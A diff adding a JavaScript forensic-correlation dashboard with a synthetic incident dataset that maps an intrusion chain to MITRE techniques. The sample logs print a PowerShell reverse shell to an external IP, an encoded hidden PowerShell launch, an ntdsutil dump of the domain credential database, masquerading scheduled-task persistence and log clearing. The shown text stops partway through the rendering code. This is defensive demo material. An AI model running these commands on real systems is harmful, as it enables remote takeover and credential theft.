@@ -1,0 +1,1393 @@
+/* ═══════════════════════════════════════════════════════════════
+   THREAT STORM — EVIDENCECHAIN™ FORENSIC CORRELATION ENGINE
+   Haute Cyber Intelligence Bureau • Deterministic Event Graph Engine
+   ═══════════════════════════════════════════════════════════════ */
+
+(function () {
+    'use strict';
+
+    // ═══════════════════════════════════════════════════════════
+    // 1. DETERMINISTIC INVESTIGATION DATASET (INC-2026-8841)
+    // ═══════════════════════════════════════════════════════════
+    const DEFAULT_INVESTIGATION = {
+        id: "INC-2026-8841",
+        title: "SolarStorm APT: Multi-Stage Domain Controller Compromise & Egress",
+        severity: "CRITICAL",
+        cvss: 9.8,
+        sector: "Financial Core Infrastructure",
+        classification: "Synthetic Deterministic Sample Investigation (SOC Verification)",
+        leadAnalyst: "Commander Yash K. (Haute Intelligence Bureau)",
+        generatedAt: "2026-10-24T14:40:00Z",
+        targetOrg: "Apex Global Custody & Clearing",
+        telemetryWarnings: [
+            {
+                id: "WARN-01",
+                severity: "warning",
+                title: "Incomplete Workstation Sensor Buffer",
+                message: "Workstation ws-fin-042 ring buffer dropped network packets between 14:18:02 and 14:21:45 UTC. Egress volume on Edge REL-04 is estimated from DC-side ingress flow only.",
+                impactedNodes: ["EVT-105"],
+                sensor: "EDR Network Packet Intercept"
+            },
+            {
+                id: "WARN-02",
+                severity: "warning",
+                title: "Stale Domain Controller Event Telemetry",
+                message: "Domain Controller dc-auth-prod-03 audit forwarding pipeline lag reached 12.4m during NTDS extraction. Raw security event EID 4662 arrived out-of-order.",
+                impactedNodes: ["EVT-106"],
+                sensor: "Active Directory Forwarding Agent"
+            }
+        ],
+        events: [
+            {
+                id: "EVT-101",
+                title: "Malicious Attachment Execution",
+                stage: "Initial Access",
+                mitre: "T1566.001",
+                mitreName: "Spearphishing Attachment",
+                timestamp: "2026-10-24 14:12:05 UTC",
+                asset: "ws-fin-042.internal",
+                user: "CORP\\m.reynolds",
+                status: "confirmed", // confirmed | suspected | unverified | disputed
+                severity: "high",
+                telemetry: "EDR Process Telemetry (Sysmon EID 1)",
+                process: "EXCEL.EXE (PID 8412) -> cmd.exe /c powershell.exe -enc...",
+                telemetryHealth: "healthy",
+                requiredEvidence: [
+                    { name: "Parent Process Lineage (EXCEL.EXE)", status: "present", note: "Verified parent PID 8412, Session 1" },
+                    { name: "Attachment SHA256 Hash", status: "present", note: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" },
+                    { name: "Inbound Email Envelope Metadata", status: "present", note: "SMTP Message-ID: <202610241408.inv-891@q4-finance-notice.com>" },
+                    { name: "User Kerberos Token Context", status: "present", note: "Ticket granting session valid for CORP\\m.reynolds" }
+                ],
+                rawSnippet: `EventID: 1 (ProcessCreate)
+UtcTime: 2026-10-24 14:12:05.114
+ProcessGuid: {D2A85F14-1205-671A-0000-0010E8124000}
+ProcessId: 9104
+Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+CommandLine: powershell.exe -NoP -NonI -W Hidden -Enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLi4u
+ParentProcessId: 8412
+ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE
+User: CORP\\m.reynolds`,
+                notes: "User clicked high-urgency macro document titled 'Q4_Executive_Wire_Schedule.xlsm'."
+            },
+            {
+                id: "EVT-102",
+                title: "In-Memory C2 Stager & Beaconing",
+                stage: "Execution",
+                mitre: "T1059.001",
+                mitreName: "PowerShell ScriptBlock",
+                timestamp: "2026-10-24 14:12:38 UTC",
+                asset: "ws-fin-042.internal",
+                user: "CORP\\m.reynolds",
+                status: "confirmed",
+                severity: "critical",
+                telemetry: "PowerShell ScriptBlock Logging (EID 4104)",
+                process: "powershell.exe (PID 9104)",
+                telemetryHealth: "healthy",
+                requiredEvidence: [
+                    { name: "Deobfuscated ScriptBlock AST", status: "present", note: "AMSI buffer reconstructed payload successfully" },
+                    { name: "Socket Connection to External IP", status: "present", note: "TCP 185.220.101.44:443 (ESTABLISHED)" },
+                    { name: "Threat Intel Blacklist Signature", status: "present", note: "Matched APT-Vanguard Command Server Cluster" }
+                ],
+                rawSnippet: `EventID: 4104 (ScriptBlockLogging)
+ScriptBlockText:
+$wc = New-Object System.Net.Sockets.TcpClient("185.220.101.44", 443);
+$stream = $wc.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+}`,
+                notes: "Reverse shell established direct beaconing every 60s with randomized 15% jitter."
+            },
+            {
+                id: "EVT-103",
+                title: "Scheduled Task Persistence Staging",
+                stage: "Persistence",
+                mitre: "T1053.005",
+                mitreName: "Scheduled Task / Job",
+                timestamp: "2026-10-24 14:15:12 UTC",
+                asset: "ws-fin-042.internal",
+                user: "CORP\\SYSTEM",
+                status: "suspected",
+                severity: "medium",
+                telemetry: "TaskScheduler Operational (EID 106)",
+                process: "schtasks.exe /create /tn 'OneDriveHealthSync' /tr 'rundll32.exe...'",
+                telemetryHealth: "healthy",
+                requiredEvidence: [
+                    { name: "Task XML Definition", status: "present", note: "Task scheduled to trigger at every workstation boot" },
+                    { name: "Target Binary Executable Path", status: "present", note: "C:\\ProgramData\\OneDrive\\sync_helper.dll" },
+                    { name: "Registry Run Key Mirror", status: "missing", note: "Registry monitor did not detect expected mirror key" }
+                ],
+                rawSnippet: `EventID: 106 (TaskRegistered)
+TaskName: \\OneDriveHealthSync
+UserContext: NT AUTHORITY\\SYSTEM
+Action: rundll32.exe C:\\ProgramData\\OneDrive\\sync_helper.dll,DllRegisterServer
+Trigger: AtLogon / Every 4 Hours`,
+                notes: "Masquerading as Microsoft OneDrive internal sync worker."
+            },
+            {
+                id: "EVT-104",
+                title: "LSASS Memory Dump & Injection",
+                stage: "Credential Access",
+                mitre: "T1003.001",
+                mitreName: "LSASS Memory Access",
+                timestamp: "2026-10-24 14:17:40 UTC",
+                asset: "ws-fin-042.internal",
+                user: "NT AUTHORITY\\SYSTEM",
+                status: "confirmed",
+                severity: "critical",
+                telemetry: "Sysmon Process Access (EID 10)",
+                process: "rundll32.exe (PID 10244) -> lsass.exe (PID 620)",
+                telemetryHealth: "healthy",
+                requiredEvidence: [
+                    { name: "GrantedAccess Mask (0x1010)", status: "present", note: "PROCESS_VM_READ | PROCESS_QUERY_INFORMATION" },
+                    { name: "Call Trace Memory Stack", status: "present", note: "dbgcore.dll!MiniDumpWriteDump -> ntdll.dll!NtReadVirtualMemory" },
+                    { name: "Target LSASS PID Verification", status: "present", note: "PID 620 verified authoritative Local Security Authority" },
+                    { name: "Extracted Ticket Artifact Dump", status: "present", note: "Recovered TGT hash for service account svc-backup-admin" }
+                ],
+                rawSnippet: `EventID: 10 (ProcessAccess)
+SourceImage: C:\\Windows\\System32\\rundll32.exe
+SourceProcessId: 10244
+TargetImage: C:\\Windows\\System32\\lsass.exe
+TargetProcessId: 620
+GrantedAccess: 0x1010
+CallTrace: C:\\Windows\\System32\\dbgcore.dll+0x31a2|C:\\Windows\\System32\\KERNELBASE.dll+0x18b20`,
+                notes: "Memory dump harvested active Kerberos tickets for high-privilege domain service accounts."
+            },
+            {
+                id: "EVT-105",
+                title: "Remote Service Lateral Pivot via SMB",
+                stage: "Lateral Movement",
+                mitre: "T1021.002",
+                mitreName: "SMB/Windows Admin Shares",
+                timestamp: "2026-10-24 14:19:55 UTC",
+                asset: "dc-auth-prod-03.internal",
+                user: "CORP\\svc-backup-admin",
+                status: "unverified",
+                severity: "critical",
+                telemetry: "Windows Security EID 7045 & NetFlow",
+                process: "services.exe -> PSEXESVC.exe (PID 4481)",
+                telemetryHealth: "warning",
+                requiredEvidence: [
+                    { name: "Source Workstation RPC Egress PCAP", status: "missing", note: "Missing due to ws-fin-042 sensor ring buffer drop" },
+                    { name: "Target DC Service Install Event (EID 7045)", status: "present", note: "Service 'PSEXESVC' installed on Domain Controller" },
+                    { name: "Service Account Auth Ticket (#88491)", status: "present", note: "Kerberos TGS request matched ticket dumped in EVT-104" }
+                ],
+                rawSnippet: `EventID: 7045 (ServiceInstalled)
+ServiceName: PSEXESVC
+ImagePath: %SystemRoot%\\PSEXESVC.exe
+ServiceType: user mode service
+StartType: demand start
+AccountName: LocalSystem
+ClientAddress: 10.14.8.42 (ws-fin-042)`,
+                notes: "⚠️ UNVERIFIED CAUSALITY: Missing source PCAP packets. Correlation established via target DC Kerberos log and client IP."
+            },
+            {
+                id: "EVT-106",
+                title: "Volume Shadow Copy & NTDS.dit Extraction",
+                stage: "Collection",
+                mitre: "T1003.003",
+                mitreName: "NTDS Database Shadow Extraction",
+                timestamp: "2026-10-24 14:24:10 UTC",
+                asset: "dc-auth-prod-03.internal",
+                user: "CORP\\svc-backup-admin",
+                status: "suspected",
+                severity: "critical",
+                telemetry: "VSS Operational Audit & Command Line",
+                process: "ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\\Windows\\Temp\\ntds_bk' q q",
+                telemetryHealth: "warning",
+                requiredEvidence: [
+                    { name: "ntdsutil Process Command Parameters", status: "present", note: "Full IFM creation switch identified" },
+                    { name: "Temporary Dump Directory File Handle", status: "present", note: "Created C:\\Windows\\Temp\\ntds_bk\\Active Directory\\ntds.dit" },
+                    { name: "VSS Volume Shadow Snapshot ID", status: "missing", note: "Stale DC agent failed to capture snapshot UUID" }
+                ],
+                rawSnippet: `EventID: 4688 (ProcessCreation)
+SubjectUserName: svc-backup-admin
+NewProcessName: C:\\Windows\\System32\\ntdsutil.exe
+CommandLine: ntdsutil.exe "ac i ntds" "ifm" "create full C:\\Windows\\Temp\\ntds_bk" q q
+ParentProcessName: C:\\Windows\\PSEXESVC.exe`,
+                notes: "Attempted full Active Directory credential database snapshot creation for offline cracking."
+            },
+            {
+                id: "EVT-107",
+                title: "Encrypted C2 Tunnel Exfiltration",
+                stage: "Exfiltration",
+                mitre: "T1048.003",
+                mitreName: "Exfiltration Over Encrypted Non-C2 Protocol",
+                timestamp: "2026-10-24 14:31:02 UTC",
+                asset: "dc-auth-prod-03.internal",
+                user: "CORP\\svc-backup-admin",
+                status: "confirmed",
+                severity: "critical",
+                telemetry: "Perimeter Deep Packet Inspection & Zeek SSL",
+                process: "svchost.exe (Injected Reverse SOCKS Tunnel)",
+                telemetryHealth: "healthy",
+                requiredEvidence: [
+                    { name: "Encrypted Egress Volume Record (2.34 MB)", status: "present", note: "High entropy byte distribution matching AES archive" },
+                    { name: "Target IP Reputational Feed Hit", status: "present", note: "185.220.101.44 flagged by 6 commercial threat feeds" },
+                    { name: "TLS JA3/JA3S Fingerprint Match", status: "present", note: "JA3: 72c589329862cd402c75a13a7234807e (CobaltStrike/Metasploit)" }
+                ],
+                rawSnippet: `Zeek conn.log / ssl.log
+ts: 2026-10-24 14:31:02.894
+uid: C6T11a3J89vN1z2k98
+id.orig_h: 10.14.2.10 (dc-auth-prod-03)
+id.orig_p: 49812
+id.resp_h: 185.220.101.44
+id.resp_p: 443
+proto: tcp
+orig_bytes: 2453670
+resp_bytes: 14210
+conn_state: SF
+ja3: 72c589329862cd402c75a13a7234807e
+server_name: c2-telemetry-gateway.securecloud-routing.net`,
+                notes: "Exfiltration completed over outbound port 443. Target domain controller isolated via perimeter null-route."
+            },
+            {
+                id: "EVT-108",
+                title: "Security Event Log Clear Attempt",
+                stage: "Defense Evasion",
+                mitre: "T1070.001",
+                mitreName: "Clear Windows Event Logs",
+                timestamp: "2026-10-24 14:33:15 UTC",
+                asset: "ws-fin-042.internal",
+                user: "CORP\\m.reynolds",
+                status: "disputed",
+                severity: "high",
+                telemetry: "SIEM Audit Engine Flag",
+                process: "wevtutil.exe cl Security",
+                telemetryHealth: "warning",
+                requiredEvidence: [
+                    { name: "Wevtutil Command Trigger Record", status: "present", note: "Command executed via maintenance task" },
+                    { name: "Windows EventID 1102 (Log Cleared)", status: "disputed", note: "SIEM mirror shows events were NOT dropped; was scheduled retention rotation" },
+                    { name: "Threat Actor User SID Binding", status: "disputed", note: "Initiator was local SYSTEM scheduled clean-up script, not C2 thread" }
+                ],
+                rawSnippet: `EventID: 1102 (The audit log was cleared)
+Subject: NT AUTHORITY\\SYSTEM
+Channel: Security
+Note: SIEM Cross-Check flagged script 'C:\\IT\\Scripts\\weekly_event_rotate.ps1'`,
+                notes: "DISPUTED EVENT: Analyst investigation confirmed this was automated weekly IT maintenance, not threat actor anti-forensics."
+            }
+        ],
+        relationships: [
+            {
+                id: "REL-01",
+                source: "EVT-101",
+                target: "EVT-102",
+                label: "Spawns Stager",
+                ruleId: "CR-101",
+                ruleName: "Direct Parent-Child Process Hierarchy",
+                confidence: 98,
+                verification: "verified", // verified | probabilistic | unverified | disputed
+                timeDelta: "+33s",
+                explanation: "Event EVT-101 (EXCEL.EXE execution) directly spawned process PID 9104 (powershell.exe). Process token and logon session ID match exactly (Session ID: 0x2A19F). Explicit causality confirmed by OS kernel hooks.",
+                artifacts: [
+                    "ParentProcessGuid matches ChildProcessGuid parent link",
+                    "Session Token 0x2A19F identical across boundary",
+                    "AMSI buffer triggered within 1.2 seconds of process creation"
+                ]
+            },
+            {
+                id: "REL-02",
+                source: "EVT-102",
+                target: "EVT-103",
+                label: "Drops Persistence",
+                ruleId: "CR-102",
+                ruleName: "Temporal Proximity & Elevated Session Privilege",
+                confidence: 91,
+                verification: "verified",
+                timeDelta: "+2m 34s",
+                explanation: "Within 2.5 minutes of C2 beacon establishment, a persistent scheduled task was staged using the same token privilege elevation vector. File handle creation matches C2 temp path.",
+                artifacts: [
+                    "File handle to sync_helper.dll opened by PowerShell PID 9104",
+                    "Task trigger parameters match adversary payload layout"
+                ]
+            },
+            {
+                id: "REL-03",
+                source: "EVT-102",
+                target: "EVT-104",
+                label: "Injects LSASS",
+                ruleId: "CR-104",
+                ruleName: "Inter-Process Memory Handle Injection",
+                confidence: 95,
+                verification: "verified",
+                timeDelta: "+5m 02s",
+                explanation: "The C2 worker thread spawned helper rundll32.exe (PID 10244) which immediately invoked OpenProcess with PROCESS_VM_READ permissions targeting lsass.exe (PID 620). Stack trace demonstrates deterministic injection call.",
+                artifacts: [
+                    "OpenProcess API Call GrantedAccess 0x1010",
+                    "Memory dump mini-dump buffer written to \\Device\\HarddiskVolume3",
+                    "Kerberos TGT ticket recovered in adversary memory cache"
+                ]
+            },
+            {
+                id: "REL-04",
+                source: "EVT-104",
+                target: "EVT-105",
+                label: "Lateral Ticket Replay",
+                ruleId: "CR-105",
+                ruleName: "Kerberos Ticket Pass-the-Hash / Replay Correlation",
+                confidence: 74,
+                verification: "unverified",
+                timeDelta: "+2m 15s",
+                explanation: "TGT ticket for account 'svc-backup-admin' dumped from LSASS in EVT-104 was presented to Domain Controller dc-auth-prod-03 2m 15s later to install PSEXESVC. However, missing WS-042 egress PCAP makes direct causality unverified.",
+                artifacts: [
+                    "Kerberos Ticket ID #88491 matched across memory and network auth",
+                    "Source IP 10.14.8.42 matched infected workstation",
+                    "Missing: Direct PCAP packets showing RPC call transmission"
+                ]
+            },
+            {
+                id: "REL-05",
+                source: "EVT-105",
+                target: "EVT-106",
+                label: "Executes NTDS Dump",
+                ruleId: "CR-106",
+                ruleName: "Remote Execution Session Command Propagation",
+                confidence: 89,
+                verification: "verified",
+                timeDelta: "+4m 15s",
+                explanation: "Active remote shell session initiated on Domain Controller via PSEXESVC (PID 4481) directly launched ntdsutil.exe with full IFM creation arguments under the identical elevated service account SID.",
+                artifacts: [
+                    "Parent PID 4481 matches PSEXESVC daemon",
+                    "Target dump directory C:\\Windows\\Temp\\ntds_bk created in same process tree",
+                    "Security audit log EID 4688 confirms execution context"
+                ]
+            },
+            {
+                id: "REL-06",
+                source: "EVT-106",
+                target: "EVT-107",
+                label: "Stages & Exfiltrates",
+                ruleId: "CR-107",
+                ruleName: "Staged Archive Egress Temporal Pipeline",
+                confidence: 92,
+                verification: "verified",
+                timeDelta: "+6m 52s",
+                explanation: "Completion of NTDS database shadow copy extraction was followed within 6m 52s by high-throughput encrypted egress of 2.34 MB to known threat actor IP 185.220.101.44. Byte volume closely matches compressed ntds.dit archive.",
+                artifacts: [
+                    "NetFlow session timestamp immediately subsequent to file close",
+                    "Egress destination IP 185.220.101.44 identical to Initial C2 in EVT-102",
+                    "Encrypted protocol fingerprint JA3 confirms known adversary tooling"
+                ]
+            },
+            {
+                id: "REL-07",
+                source: "EVT-103",
+                target: "EVT-108",
+                label: "Defense Evasion Link",
+                ruleId: "CR-108",
+                ruleName: "Post-Exploitation Anti-Forensics Heuristic",
+                confidence: 34,
+                verification: "disputed",
+                timeDelta: "+18m 03s",
+                explanation: "Initial automated correlation flagged log clearing as attacker anti-forensics following persistence setup. Analyst review proved Event EVT-108 was normal scheduled IT maintenance and not connected to adversary activity.",
+                artifacts: [
+                    "Disputed correlation: Independent scheduled task executed by LocalSystem",
+                    "No correlation with C2 thread memory space"
+                ]
+            }
+        ],
+        auditTrail: [
+            { time: "14:40:12", text: "Automated EvidenceChain graph constructed from 8 correlated events across 3 telemetry pipelines." },
+            { time: "14:42:30", text: "Analyst YK reviewed EVT-108 and marked status as DISPUTED (Routine IT Maintenance)." },
+            { time: "14:44:05", text: "Correlation Engine flagged telemetry warning WARN-01: missing PCAP on Workstation-042." }
+        ]
+    };
+
+    // ═══════════════════════════════════════════════════════════
+    // 2. STATE CONTROLLER
+    // ═══════════════════════════════════════════════════════════
+    let investigation = JSON.parse(JSON.stringify(DEFAULT_INVESTIGATION));
+    let selectedEventId = "EVT-104"; // Default selected event
+    let selectedRelationshipId = null;
+    let activeInspectorTab = "event"; // "event" | "evidence" | "correction"
+    let searchQuery = "";
+    let statusFilter = "all";
+    let transform = { x: 40, y: 30, k: 1 };
+    let isPanning = false;
+    let panStart = { x: 0, y: 0 };
+
+    // Node Positions (Hierarchical Cyber Kill Chain Layout)
+    const NODE_POSITIONS = {
+        "EVT-101": { x: 80,  y: 120 },
+        "EVT-102": { x: 260, y: 120 },
+        "EVT-103": { x: 260, y: 310 },
+        "EVT-104": { x: 440, y: 120 },
+        "EVT-105": { x: 620, y: 120 },
+        "EVT-106": { x: 800, y: 120 },
+        "EVT-107": { x: 980, y: 120 },
+        "EVT-108": { x: 440, y: 310 }
+    };
+
+    // ═══════════════════════════════════════════════════════════
+    // 3. COMPUTATION ENGINES (COMPLETENESS & RE-EVALUATION)
+    // ═══════════════════════════════════════════════════════════
+
+    function calculateEvidenceCompleteness() {
+        let totalItems = 0;
+        let presentItems = 0;
+
+        investigation.events.forEach(evt => {
+            if (evt.status === "disputed") return; // exclude disputed events from required chain
+            evt.requiredEvidence.forEach(item => {
+                totalItems++;
+                if (item.status === "present") presentItems++;
+            });
+        });
+
+        const percent = totalItems > 0 ? Math.round((presentItems / totalItems) * 100) : 0;
+        return {
+            percent,
+            present: presentItems,
+            total: totalItems
+        };
+    }
+
+    function reevaluateEvidenceChain() {
+        // Deterministically recompute relationship confidences based on node statuses
+        investigation.relationships.forEach(rel => {
+            const src = investigation.events.find(e => e.id === rel.source);
+            const tgt = investigation.events.find(e => e.id === rel.target);
+            if (!src || !tgt) return;
+
+            let baseConfidence = 90;
+
+            // If either node is disputed, relationship confidence collapses
+            if (src.status === "disputed" || tgt.status === "disputed") {
+                rel.confidence = 22;
+                rel.verification = "disputed";
+                rel.explanation = `BROKEN EVIDENCE LINK: Node ${src.status === "disputed" ? src.id : tgt.id} has been DISPUTED by analyst review. Dependent correlation path is invalid.`;
+                return;
+            }
+
+            // Adjust based on node verification statuses
+            if (src.status === "unverified" || tgt.status === "unverified") {
+                baseConfidence -= 25;
+                rel.verification = "unverified";
+            } else if (src.status === "suspected" || tgt.status === "suspected") {
+                baseConfidence -= 10;
+                rel.verification = "probabilistic";
+            } else {
+                rel.verification = "verified";
+            }
+
+            // Check evidence completeness of source and target
+            const srcMissing = src.requiredEvidence.filter(i => i.status === "missing").length;
+            const tgtMissing = tgt.requiredEvidence.filter(i => i.status === "missing").length;
+            baseConfidence -= (srcMissing * 4 + tgtMissing * 4);
+
+            rel.confidence = Math.max(15, Math.min(99, baseConfidence));
+        });
+
+        // Add audit trail entry
+        const now = new Date().toTimeString().split(' ')[0];
+        investigation.auditTrail.unshift({
+            time: now,
+            text: `Analyst re-evaluated correlation matrix. Evidence completeness updated to ${calculateEvidenceCompleteness().percent}%.`
+        });
+
+        // Re-render
+        renderCompletenessBar();
+        renderGraph();
+        renderInspector();
+        renderAuditTrail();
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // 4. GRAPH RENDERING & HIGHLIGHTING
+    // ═══════════════════════════════════════════════════════════
+
+    function getConnectedEntities(nodeId) {
+        const connectedNodes = new Set([nodeId]);
+        const connectedEdges = new Set();
+
+        investigation.relationships.forEach(rel => {
+            if (rel.source === nodeId || rel.target === nodeId) {
+                connectedEdges.add(rel.id);
+                connectedNodes.add(rel.source);
+                connectedNodes.add(rel.target);
+            }
+        });
+
+        return { connectedNodes, connectedEdges };
+    }
+
+    function renderGraph() {
+        const svg = document.getElementById('ev-graph-svg');
+        if (!svg) return;
+
+        // Determine highlighting
+        let activeNodes = null;
+        let activeEdges = null;
+
+        if (selectedEventId) {
+            const res = getConnectedEntities(selectedEventId);
+            activeNodes = res.connectedNodes;
+            activeEdges = res.connectedEdges;
+        } else if (selectedRelationshipId) {
+            const rel = investigation.relationships.find(r => r.id === selectedRelationshipId);
+            if (rel) {
+                activeNodes = new Set([rel.source, rel.target]);
+                activeEdges = new Set([rel.id]);
+            }
+        }
+
+        // Filtering by search query & status
+        const filteredEvents = investigation.events.filter(e => {
+            if (statusFilter !== "all" && e.status !== statusFilter) return false;
+            if (searchQuery) {
+                const q = searchQuery.toLowerCase();
+                const match = e.id.toLowerCase().includes(q) ||
+                              e.title.toLowerCase().includes(q) ||
+                              e.mitre.toLowerCase().includes(q) ||
+                              e.asset.toLowerCase().includes(q) ||
+                              e.process.toLowerCase().includes(q);
+                if (!match) return false;
+            }
+            return true;
+        });
+        const filteredNodeIds = new Set(filteredEvents.map(e => e.id));
+
+        // Build SVG content inside a pan-zoom group
+        let html = `
+            <defs>
+                <filter id="ev-glow" x="-20%" y="-20%" width="140%" height="140%">
+                    <feGaussianBlur stdDeviation="3" result="blur"/>
+                    <feComposite in="SourceGraphic" in2="blur" operator="over"/>
+                </filter>
+                <marker id="ev-arrow" viewBox="0 0 10 10" refX="22" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                    <path d="M 0 1 L 9 5 L 0 9 z" fill="#38bdf8"/>
+                </marker>
+                <marker id="ev-arrow-gold" viewBox="0 0 10 10" refX="22" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                    <path d="M 0 1 L 9 5 L 0 9 z" fill="#d4af37"/>
+                </marker>
+                <marker id="ev-arrow-disputed" viewBox="0 0 10 10" refX="22" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                    <path d="M 0 1 L 9 5 L 0 9 z" fill="#ff2d55"/>
+                </marker>
+            </defs>
+            <g transform="translate(${transform.x}, ${transform.y}) scale(${transform.k})" id="ev-graph-root">
+                <!-- Background Grid Lines -->
+                <g class="ev-grid-lines" opacity="0.12">
+                    ${Array.from({ length: 14 }).map((_, i) => `<line x1="${i * 90}" y1="0" x2="${i * 90}" y2="520" stroke="#38bdf8" stroke-dasharray="2 4"/>`).join('')}
+                    ${Array.from({ length: 7 }).map((_, i) => `<line x1="0" y1="${i * 80}" x2="1180" y2="${i * 80}" stroke="#38bdf8" stroke-dasharray="2 4"/>`).join('')}
+                </g>
+
+                <!-- Kill Chain Stages Labels -->
+                <g class="ev-stage-headers" opacity="0.4" font-family="JetBrains Mono" font-size="9" fill="#90a0b8">
+                    <text x="80" y="35" text-anchor="middle">INITIAL ACCESS</text>
+                    <text x="260" y="35" text-anchor="middle">EXECUTION</text>
+                    <text x="440" y="35" text-anchor="middle">CREDENTIAL ACCESS</text>
+                    <text x="620" y="35" text-anchor="middle">LATERAL PIVOT</text>
+                    <text x="800" y="35" text-anchor="middle">COLLECTION</text>
+                    <text x="980" y="35" text-anchor="middle">EXFILTRATION</text>
+                </g>
+
+                <!-- Edges (Relationships) -->
+                <g class="ev-edges-layer">
+        `;
+
+        investigation.relationships.forEach(rel => {
+            const p1 = NODE_POSITIONS[rel.source];
+            const p2 = NODE_POSITIONS[rel.target];
+            if (!p1 || !p2) return;
+
+            // If either node is filtered out, skip
+            if (!filteredNodeIds.has(rel.source) || !filteredNodeIds.has(rel.target)) return;
+
+            const isSelected = selectedRelationshipId === rel.id;
+            const isHighlighted = activeEdges && activeEdges.has(rel.id);
+            const isDimmed = activeEdges && !activeEdges.has(rel.id);
+
+            let marker = "url(#ev-arrow)";
+            if (isSelected) marker = "url(#ev-arrow-gold)";
+            if (rel.verification === "disputed") marker = "url(#ev-arrow-disputed)";
+
+            // Curved quadratic bezier path
+            const dx = p2.x - p1.x;
+            const dy = p2.y - p1.y;
+            const cx = p1.x + dx / 2;
+            const cy = p1.y + dy / 2 - (dx === 0 ? 0 : 20);
+
+            const pathD = `M ${p1.x} ${p1.y} Q ${cx} ${cy} ${p2.x} ${p2.y}`;
+
+            let edgeClasses = "ev-edge-path";
+            if (isSelected) edgeClasses += " ev-edge--selected";
+            if (isHighlighted) edgeClasses += " ev-edge--highlighted";
+            if (isDimmed) edgeClasses += " ev-edge--dimmed";
+            if (rel.verification === "disputed") edgeClasses += " ev-edge--disputed";
+
+            html += `
+                <path d="${pathD}" class="${edgeClasses}" data-rel-id="${rel.id}" marker-end="${marker}"/>
+                <!-- Edge Label Badge -->
+                <g class="ev-edge-label-group" data-rel-id="${rel.id}" transform="translate(${cx}, ${cy})">
+                    <rect x="-38" y="-10" width="76" height="20" rx="4" fill="#060913" stroke="${isSelected ? '#d4af37' : 'rgba(56,189,248,0.4)'}" stroke-width="1"/>
+                    <text x="0" y="3" text-anchor="middle" font-family="JetBrains Mono" font-size="8.5" font-weight="600" fill="${isSelected ? '#f3d47c' : '#90a0b8'}">
+                        ${rel.confidence}% • ${rel.ruleId}
+                    </text>
+                </g>
+            `;
+        });
+
+        html += `</g><g class="ev-nodes-layer">`;
+
+        // Nodes (Events)
+        investigation.events.forEach(evt => {
+            const pos = NODE_POSITIONS[evt.id];
+            if (!pos) return;
+
+            const isVisible = filteredNodeIds.has(evt.id);
+            if (!isVisible) return;
+
+            const isSelected = selectedEventId === evt.id;
+            const isHighlighted = activeNodes && activeNodes.has(evt.id);
+            const isDimmed = activeNodes && !activeNodes.has(evt.id);
+
+            let nodeClasses = "ev-node-group";
+            if (isSelected) nodeClasses += " ev-node--selected";
+            if (isHighlighted) nodeClasses += " ev-node--highlighted";
+            if (isDimmed) nodeClasses += " ev-node--dimmed";
+
+            // Status border color
+            let statusColor = "#00e676";
+            if (evt.status === "suspected") statusColor = "#f59e0b";
+            if (evt.status === "unverified") statusColor = "#c084fc";
+            if (evt.status === "disputed") statusColor = "#ff2d55";
+
+            // Card dimensions
+            const w = 150;
+            const h = 76;
+            const nx = pos.x - w / 2;
+            const ny = pos.y - h / 2;
+
+            html += `
+                <g class="${nodeClasses}" data-node-id="${evt.id}" transform="translate(${nx}, ${ny})">
+                    <!-- Node Body Box -->
+                    <rect class="ev-node-box" width="${w}" height="${h}" rx="8"
+                          fill="#090e1a" stroke="${isSelected ? '#f3d47c' : statusColor}" stroke-width="${isSelected ? 2.4 : 1.4}" />
+
+                    <!-- Header Accent Bar -->
+                    <rect x="0" y="0" width="${w}" height="4" rx="2" fill="${statusColor}" />
+
+                    <!-- Event ID & MITRE Pill -->
+                    <text x="8" y="18" font-family="JetBrains Mono" font-size="9" font-weight="700" fill="${statusColor}">
+                        ${evt.id}
+                    </text>
+                    <rect x="74" y="8" width="68" height="13" rx="3" fill="rgba(56,189,248,0.12)" stroke="rgba(56,189,248,0.3)" stroke-width="0.8"/>
+                    <text x="108" y="17.5" text-anchor="middle" font-family="JetBrains Mono" font-size="8" fill="#38bdf8">
+                        ${evt.mitre}
+                    </text>
+
+                    <!-- Event Title (Truncated if long) -->
+                    <text x="8" y="34" font-family="Inter" font-size="10" font-weight="600" fill="#f0f4fa">
+                        ${evt.title.length > 20 ? evt.title.substring(0, 18) + '…' : evt.title}
+                    </text>
+
+                    <!-- Host Asset -->
+                    <text x="8" y="48" font-family="JetBrains Mono" font-size="8.5" fill="#90a0b8">
+                        🖥️ ${evt.asset.split('.')[0]}
+                    </text>
+
+                    <!-- Status Pill at Bottom -->
+                    <rect x="8" y="55" width="70" height="14" rx="7" fill="rgba(0,0,0,0.5)" stroke="${statusColor}" stroke-width="0.7"/>
+                    <circle cx="16" cy="62" r="3" fill="${statusColor}"/>
+                    <text x="24" y="65" font-family="JetBrains Mono" font-size="7.5" font-weight="600" fill="#ffffff" text-transform="uppercase">
+                        ${evt.status}
+                    </text>
+
+                    <!-- Telemetry Health Warning Dot -->
+                    ${evt.telemetryHealth === 'warning' ? `
+                        <circle cx="${w - 12}" cy="62" r="5" fill="#f59e0b" filter="url(#ev-glow)"/>
+                        <text x="${w - 14}" y="65" font-family="Inter" font-size="8" font-weight="700" fill="#000000">!</text>
+                    ` : ''}
+                </g>
+            `;
+        });
+
+        html += `</g></g>`;
+        svg.innerHTML = html;
+        bindSvgEvents();
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // 5. INSPECTOR & DETAILS PANEL RENDERING
+    // ═══════════════════════════════════════════════════════════
+
+    function renderInspector() {
+        const body = document.getElementById('ev-inspector-body');
+        if (!body) return;
+
+        if (activeInspectorTab === "event") {
+            const evt = investigation.events.find(e => e.id === selectedEventId) || investigation.events[0];
